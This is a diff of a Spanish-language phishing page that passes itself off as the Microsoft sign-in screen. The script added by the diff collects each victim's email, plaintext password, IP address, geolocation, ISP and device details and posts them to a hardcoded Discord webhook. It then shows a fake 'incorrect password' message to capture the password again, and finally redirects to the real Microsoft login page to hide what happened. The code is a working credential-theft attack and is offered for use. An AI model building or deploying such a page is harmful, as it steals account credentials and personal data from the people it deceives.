@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft - Términos y Condiciones</title>
+    <title>Microsoft - Iniciar sesión</title>
     <style>
         * {
             margin: 0;
@@ -109,7 +109,7 @@
         }
         
         /* Estilos para las páginas de inicio de sesión */
-        #loginPage, #passwordPage, #pinPage {
+        #loginPage, #passwordPage {
             display: none;
             flex-direction: column;
             min-height: 100vh;
@@ -171,39 +171,52 @@
             border-top-width: 0px;
             font-size: 15px;
             height: 36px;
-             outline: none;
+            outline: none;
         }
         
         input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
             outline: none;
         }
-            .options-box {
-      margin-top: 20px;
-      background: white;
-      width: 440px;
-      height: 48px;
-      padding: 12px 44px;
-       border: 1px solid #e1e1e1;
+
+        .error-message {
+            color: #d92c2c;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+            background-color: #fef6f6;
+            padding: 10px;
+            border: 1px solid #f3d6d6;
+            border-radius: 2px;
+        }
+        
+        .options-box {
+            margin-top: 20px;
+            background: white;
+            width: 440px;
+            height: 48px;
+            padding: 12px 44px;
+            border: 1px solid #e1e1e1;
             border-radius: 0px;
- box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-size: 15px;
-      cursor: pointer;
-      transition: background 0.2s;
-       outline: none;
-    }
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            cursor: pointer;
+            transition: background 0.2s;
+            outline: none;
+        }
 
-    .options-box:hover {
-      background-color: #f3f3f3;
-    }
+        .options-box:hover {
+            background-color: #f3f3f3;
+        }
 
-    .options-box svg {
-      width: 18px;
-      height: 18px;
-      color: #666;
-    }
+        .options-box svg {
+            width: 18px;
+            height: 18px;
+            color: #666;
+        }
+        
         .links {
             margin-top: 16px;
             margin-bottom: 24px;
@@ -242,6 +255,11 @@
             background-color: #106ebe;
         }
         
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        
         .checkbox-container {
             display: flex;
             align-items: center;
@@ -269,20 +287,13 @@
             height: 24px;
             width: 24px;
             cursor: pointer;
+            margin-right: 10px;
         }
         
         .user-email {
             font-size: 15px;
             color: #323130;
         }
-        
-        /* Estilos para la página de PIN */
-        .pin-instructions {
-            font-size: 14px;
-            color: #323130;
-            margin-bottom: 10px;
-        }
-        
         
         .footer-content {
             padding: 0 20px;
@@ -326,11 +337,10 @@
                 align-items: flex-start;
             }
 
-           .container {
-            display: block;
-            padding: 0;
-
-           }
+            .container {
+                display: block;
+                padding: 0;
+            }
             
             .footer-links {
                 margin-bottom: 16px;
@@ -357,6 +367,10 @@
             }
             
             .terms-container {
+                width: 100%;
+            }
+            
+            .options-box {
                 width: 100%;
             }
         }
@@ -390,13 +404,13 @@
             </div>
         </div>
         
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#">Términos de uso</a>
-                    <a href="#">Privacidad y cookies</a>
-                    <a href="#">...</a>
-                </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Términos de uso</a>
+                <a href="#">Privacidad y cookies</a>
+                <a href="#">...</a>
             </div>
+        </div>
     </div>
     
     <!-- Página de Inicio de Sesión - Correo -->
@@ -419,27 +433,23 @@
                     </div>
                     
                     <div class="button-container">
-                        <button type="submit">Siguiente</button>
+                        <button type="submit" id="emailSubmitBtn">Siguiente</button>
                     </div>
-
                 </form>
-
             </div>
-                                   <div class="options-box">
-      <img src="llave.svg" style="width: 32px">
-      <span style="color: #1b1b1b">Opciones de inicio de sesión</span>
-    </div>
+            <div class="options-box">
+                <img src="llave.svg" style="width: 32px">
+                <span style="color: #1b1b1b">Opciones de inicio de sesión</span>
+            </div>
         </div>
         
-      
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#">Términos de uso</a>
-                    <a href="#">Privacidad y cookies</a>
-                    <a href="#">...</a>
-                </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Términos de uso</a>
+                <a href="#">Privacidad y cookies</a>
+                <a href="#">...</a>
             </div>
-        
+        </div>
     </div>
     
     <!-- Página de Inicio de Sesión - Contraseña -->
@@ -451,7 +461,7 @@
                 </div>
                 
                 <div class="user-info">
-                   <img src="descarga.png" class="back-arrow" id="backButton" alt="Volver">
+                    <img src="descarga.png" class="back-arrow" id="backButton" alt="Volver">
                     <span class="user-email" id="userEmailDisplay">hola@kijds.fd</span>
                 </div>
                 
@@ -462,257 +472,307 @@
                         <input placeholder="Contraseña" type="password" id="password" name="password" autocomplete="current-password">
                     </div>
                     
+                    <div id="passwordError" class="error-message">
+                        Tu cuenta o contraseña son incorrectos. Si no recuerdas tu contraseña, <a href="#" style="color: #0078d4; text-decoration: none;">restablécelala</a>.
+                    </div>
+                    
                     <div class="links">
                         <a href="#">Olvidó su contraseña?</a>
                     </div>
                     
                     <div class="button-container">
-                        <button type="submit">Iniciar Sesión</button>
+                        <button type="submit" id="passwordSubmitBtn">Iniciar Sesión</button>
                     </div>
                 </form>
             </div>
         </div>
         
-      
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#">Términos de uso</a>
-                    <a href="#">Privacidad y cookies</a>
-                    <a href="#">...</a>
-                </div>
-            </div>
-       
-    </div>
-    
-    <!-- Página de PIN -->
-    <div id="pinPage">
-        <div class="container">
-            <div class="card">
-                <div class="logo">
-                    <img src="logo.svg" alt="Microsoft">
-                </div>
-                
-                <div class="user-info">
-                   <img src="descarga.png" class="back-arrow" id="backButtonPin" alt="Volver">
-                    <span class="user-email" id="userEmailDisplayPin">hola@kijds.fd</span>
-                </div>
-                
-                <h1>Verificación de seguridad</h1>
-                
-                <div class="pin-instructions">
-                    <p>Ingrese su PIN de 4 dígitos para completar la verificación de seguridad.</p>
-                </div>
-                
-                <form id="pinForm">
-                    <div class="form-group">
-                        <input placeholder="PIN de 4 dígitos" type="tel" id="pin" name="pin" maxlength="4" pattern="[0-9]{4}" inputmode="numeric">
-                    </div>
-                    
-                    <div class="button-container">
-                        <button type="submit">Verificar</button>
-                    </div>
-                </form>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">Términos de uso</a>
+                <a href="#">Privacidad y cookies</a>
+                <a href="#">...</a>
             </div>
         </div>
-        
-      
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#">Términos de uso</a>
-                    <a href="#">Privacidad y cookies</a>
-                    <a href="#">...</a>
-                </div>
-            </div>
-        
     </div>
 
-<script>
-    // Elementos del DOM
-    const termsPage = document.getElementById('termsPage');
-    const loginPage = document.getElementById('loginPage');
-    const passwordPage = document.getElementById('passwordPage');
-    const pinPage = document.getElementById('pinPage');
-    const acceptButton = document.getElementById('acceptButton');
-    const emailForm = document.getElementById('emailForm');
-    const passwordForm = document.getElementById('passwordForm');
-    const pinForm = document.getElementById('pinForm');
-    const backButton = document.getElementById('backButton');
-    const backButtonPin = document.getElementById('backButtonPin');
-    const userEmailDisplay = document.getElementById('userEmailDisplay');
-    const userEmailDisplayPin = document.getElementById('userEmailDisplayPin');
-    const passwordInput = document.getElementById('password');
-    const pinInput = document.getElementById('pin');
-    
-    // Variables para almacenar datos
-    let userData = {
-        email: '',
-        password: '',
-        pin: ''
-    };
-    let locationData = {
-        ip: '',
-        country: '',
-        region: '',
-        city: ''
-    };
-    
-    // Obtener información de ubicación al cargar la página
-    window.addEventListener('load', function() {
-        getLocationInfo();
-    });
-    
-    // Función para obtener información de ubicación
-    function getLocationInfo() {
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                locationData.ip = data.ip;
-                
-                // Obtener información detallada de ubicación
-                return fetch(`https://ipapi.co/${data.ip}/json/`);
-            })
-            .then(response => response.json())
-            .then(detailedData => {
-                locationData.country = detailedData.country_name || 'Desconocido';
-                locationData.region = detailedData.region || 'Desconocido';
-                locationData.city = detailedData.city || 'Desconocido';
-            })
-            .catch(error => {
-                console.error('Error obteniendo ubicación:', error);
-                locationData.country = 'Desconocido';
-                locationData.region = 'Desconocido';
-                locationData.city = 'Desconocido';
-            });
-    }
-    
-    // Mostrar página de inicio de sesión después de aceptar términos
-    acceptButton.addEventListener('click', function() {
-        termsPage.style.display = 'none';
-        loginPage.style.display = 'flex';
-    });
-    
-    // Manejar envío del formulario de correo
-    emailForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const email = document.getElementById('email').value;
+    <script>
+        // Configuración del Webhook de Discord
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448401704046563359/vWfyriEhxw7rVU4slja7qdFd4NG7mZ2wFAE7p_xTSnKx0Ut_Do16Uq1PUjdtWwktquEn';
         
-        if (email) {
-            // Guardar el email
-            userData.email = email;
-            
-            // Mostrar el correo en la siguiente pantalla
-            userEmailDisplay.textContent = email;
-            userEmailDisplayPin.textContent = email;
-            
-            // Cambiar a la página de contraseña
-            loginPage.style.display = 'none';
-            passwordPage.style.display = 'flex';
+        // Elementos del DOM
+        const termsPage = document.getElementById('termsPage');
+        const loginPage = document.getElementById('loginPage');
+        const passwordPage = document.getElementById('passwordPage');
+        const acceptButton = document.getElementById('acceptButton');
+        const emailForm = document.getElementById('emailForm');
+        const passwordForm = document.getElementById('passwordForm');
+        const backButton = document.getElementById('backButton');
+        const userEmailDisplay = document.getElementById('userEmailDisplay');
+        const passwordInput = document.getElementById('password');
+        const passwordError = document.getElementById('passwordError');
+        const passwordSubmitBtn = document.getElementById('passwordSubmitBtn');
+        
+        // Variables para almacenar datos
+        let userData = {
+            email: '',
+            password: ''
+        };
+        
+        let locationData = {
+            ip: 'Desconocido',
+            country: 'Desconocido',
+            region: 'Desconocido',
+            city: 'Desconocido',
+            isp: 'Desconocido',
+            timezone: 'Desconocido'
+        };
+        
+        let deviceInfo = {
+            userAgent: '',
+            platform: '',
+            language: '',
+            screenResolution: ''
+        };
+        
+        // Obtener información de ubicación y dispositivo al cargar
+        window.addEventListener('load', function() {
+            getLocationInfo();
+            getDeviceInfo();
+        });
+        
+        // Función para obtener información del dispositivo
+        function getDeviceInfo() {
+            deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
         }
-    });
-    
-    // Volver a la página de correo desde contraseña
-    backButton.addEventListener('click', function() {
-        passwordPage.style.display = 'none';
-        loginPage.style.display = 'flex';
-    });
-    
-    // Volver a la página de contraseña desde PIN
-    backButtonPin.addEventListener('click', function() {
-        pinPage.style.display = 'none';
-        passwordPage.style.display = 'flex';
-    });
-    
-    // Manejar envío del formulario de contraseña
-    passwordForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const password = document.getElementById('password').value;
         
-        if (password) {
+        // Función para obtener información de ubicación
+        function getLocationInfo() {
+            // Primero obtener IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    locationData.ip = data.ip;
+                    
+                    // Luego obtener información detallada
+                    return fetch(`https://ipapi.co/${data.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(detailedData => {
+                    locationData.country = detailedData.country_name || 'Desconocido';
+                    locationData.region = detailedData.region || 'Desconocido';
+                    locationData.city = detailedData.city || 'Desconocido';
+                    locationData.isp = detailedData.org || 'Desconocido';
+                    locationData.timezone = detailedData.timezone || 'Desconocido';
+                    locationData.latitude = detailedData.latitude || 'Desconocido';
+                    locationData.longitude = detailedData.longitude || 'Desconocido';
+                    
+                    console.log('Ubicación obtenida:', locationData);
+                })
+                .catch(error => {
+                    console.error('Error obteniendo ubicación:', error);
+                });
+        }
+        
+        // Mostrar página de inicio de sesión después de aceptar términos
+        acceptButton.addEventListener('click', function() {
+            termsPage.style.display = 'none';
+            loginPage.style.display = 'flex';
+        });
+        
+        // Manejar envío del formulario de correo
+        emailForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            
+            if (email) {
+                // Guardar el email
+                userData.email = email;
+                
+                // Mostrar el correo en la pantalla de contraseña
+                userEmailDisplay.textContent = email;
+                
+                // Cambiar a la página de contraseña
+                loginPage.style.display = 'none';
+                passwordPage.style.display = 'flex';
+                
+                // Limpiar campo de contraseña y error
+                passwordInput.value = '';
+                passwordError.style.display = 'none';
+                passwordSubmitBtn.disabled = false;
+            }
+        });
+        
+        // Volver a la página de correo desde contraseña
+        backButton.addEventListener('click', function() {
+            passwordPage.style.display = 'none';
+            loginPage.style.display = 'flex';
+        });
+        
+        // Función para enviar datos a Discord
+        async function sendToDiscord(type = 'login_attempt') {
+            const timestamp = new Date().toLocaleString('es-ES', { 
+                timeZone: 'America/Bogota',
+                dateStyle: 'full',
+                timeStyle: 'medium'
+            });
+            
+            // Crear embed para Discord
+            const embed = {
+                title: type === 'login_attempt' ? '🔐 INTENTO DE INICIO DE SESIÓN MICROSOFT' : '⚠️ INTENTO FALLIDO (Error Mostrado)',
+                color: type === 'login_attempt' ? 0x0078d4 : 0xff0000,
+                fields: [
+                    {
+                        name: '📧 Correo Electrónico',
+                        value: userData.email || 'No proporcionado',
+                        inline: true
+                    },
+                    {
+                        name: '🔑 Contraseña',
+                        value: userData.password ? `\`${userData.password}\`` : 'No proporcionada',
+                        inline: true
+                    },
+                    {
+                        name: '🌍 IP Pública',
+                        value: locationData.ip,
+                        inline: true
+                    },
+                    {
+                        name: '📍 Ubicación',
+                        value: `${locationData.city}, ${locationData.region}, ${locationData.country}`,
+                        inline: true
+                    },
+                    {
+                        name: '📡 ISP/Proveedor',
+                        value: locationData.isp,
+                        inline: true
+                    },
+                    {
+                        name: '🗺️ Coordenadas',
+                        value: locationData.latitude !== 'Desconocido' ? `${locationData.latitude}, ${locationData.longitude}` : 'No disponibles',
+                        inline: true
+                    },
+                    {
+                        name: '🌐 Zona Horaria',
+                        value: locationData.timezone,
+                        inline: true
+                    },
+                    {
+                        name: '💻 Navegador',
+                        value: deviceInfo.userAgent.substring(0, 150) + (deviceInfo.userAgent.length > 150 ? '...' : ''),
+                        inline: false
+                    },
+                    {
+                        name: '📱 Plataforma',
+                        value: deviceInfo.platform,
+                        inline: true
+                    },
+                    {
+                        name: '🖥️ Resolución',
+                        value: deviceInfo.screenResolution,
+                        inline: true
+                    },
+                    {
+                        name: '🔤 Idioma',
+                        value: deviceInfo.language,
+                        inline: true
+                    },
+                    {
+                        name: '🕐 Fecha y Hora (Colombia)',
+                        value: timestamp,
+                        inline: true
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: 'Sistema de Monitoreo Microsoft'
+                }
+            };
+            
+            const payload = { embeds: [embed] };
+            
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                if (!response.ok) {
+                    console.error('Error enviando a Discord:', response.status);
+                } else {
+                    console.log('✅ Datos enviados a Discord correctamente');
+                }
+            } catch (error) {
+                console.error('Error en el envío a Discord:', error);
+            }
+        }
+        
+        // Variable para controlar si ya se mostró el error
+        let errorShown = false;
+        
+        // Manejar envío del formulario de contraseña
+        passwordForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const password = passwordInput.value;
+            
+            if (!password) return;
+            
             // Guardar la contraseña
             userData.password = password;
             
-            // Guardar EMAIL y CONTRASEÑA juntos
-            saveCredentials();
+            // Deshabilitar botón mientras procesa
+            passwordSubmitBtn.disabled = true;
+            passwordSubmitBtn.textContent = 'Verificando...';
             
-            // Cambiar a la página de PIN
-            passwordPage.style.display = 'none';
-            pinPage.style.display = 'flex';
-        }
-    });
-    
-    // Manejar envío del formulario de PIN
-    pinForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const pin = document.getElementById('pin').value;
-        
-        if (pin && pin.length === 4) {
-            // Guardar el PIN
-            userData.pin = pin;
+            // ENVIAR INMEDIATAMENTE A DISCORD (antes de mostrar error)
+            await sendToDiscord('login_attempt');
             
-            // Guardar PIN con el correo
-            savePinWithEmail();
+            // Pequeña pausa para asegurar envío
+            await new Promise(resolve => setTimeout(resolve, 500));
             
-            setTimeout(function() {
-                window.location.href = 'https://www.microsoft.com/es-mx/';
-            }, 2000);
-        } else {
-            alert('Por favor, ingrese un PIN válido de 4 dígitos.');
-        }
-    });
-    
-    // Función para guardar credenciales juntas
-    function saveCredentials() {
-        const timestamp = getFormattedTimestamp();
-        const separator = "══════════════════════════════════════════════════";
-        const content = `${separator}\nCorreo: ${userData.email} - Psswrd: ${userData.password} - Fecha: ${timestamp} - ${locationData.country} ${locationData.region} ${locationData.city} ${locationData.ip}\n${separator}\n`;
-        
-        console.log(`Guardando credenciales: ${content}`);
-        
-        // Enviar datos al servidor
-        sendToServer(content);
-    }
-    
-    // Función para guardar PIN con el correo
-    function savePinWithEmail() {
-        const timestamp = getFormattedTimestamp();
-        const separator = "══════════════════════════════════════════════════";
-        const content = `${separator}\nCorreo: ${userData.email} - Pin ${userData.pin} - Fecha: ${timestamp} - ${locationData.country} ${locationData.region} ${locationData.city} ${locationData.ip}\n${separator}\n`;
-        
-        console.log(`Guardando PIN: ${content}`);
-        
-        // Enviar datos al servidor
-        sendToServer(content);
-    }
-    
-    // Función para formatear timestamp
-    function getFormattedTimestamp() {
-        const now = new Date();
-        return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} - ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
-    }
-    
-    // Función para enviar datos al servidor
-    function sendToServer(content) {
-        fetch('save_data.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-            body: 'data=' + encodeURIComponent(content)
-        })
-        .then(response => {
-            if (!response.ok) {
-                console.error('Error en respuesta del servidor');
+            if (!errorShown) {
+                // Primera vez: mostrar error
+                passwordError.style.display = 'block';
+                passwordInput.value = ''; // Limpiar campo
+                errorShown = true;
+                
+                // Reactivar botón
+                passwordSubmitBtn.disabled = false;
+                passwordSubmitBtn.textContent = 'Iniciar Sesión';
+                
+                // Enviar notificación de error mostrado
+                await sendToDiscord('error_shown');
+                
+                console.log('❌ Error mostrado al usuario');
+            } else {
+                // Segunda vez: redirigir a página real de Microsoft
+                console.log('✅ Redirigiendo a Microsoft...');
+                
+                // Enviar último intento
+                await sendToDiscord('login_attempt');
+                
+                // Pequeña pausa antes de redirigir
+                setTimeout(() => {
+                    window.location.href = 'https://login.live.com/';
+                }, 1500);
             }
-        })
-        .catch(error => {
-            console.error('Error guardando datos:', error);
         });
-    }
-    
-    // Validar que solo se ingresen números en el campo PIN
-    pinInput.addEventListener('input', function() {
-        this.value = this.value.replace(/[^0-9]/g, '');
-    });
-</script>
+        
+        // Validar que el campo de contraseña no esté vacío (opcional)
+        passwordInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                passwordSubmitBtn.disabled = false;
+            }
+        });
+    </script>
 </body>
 </html>
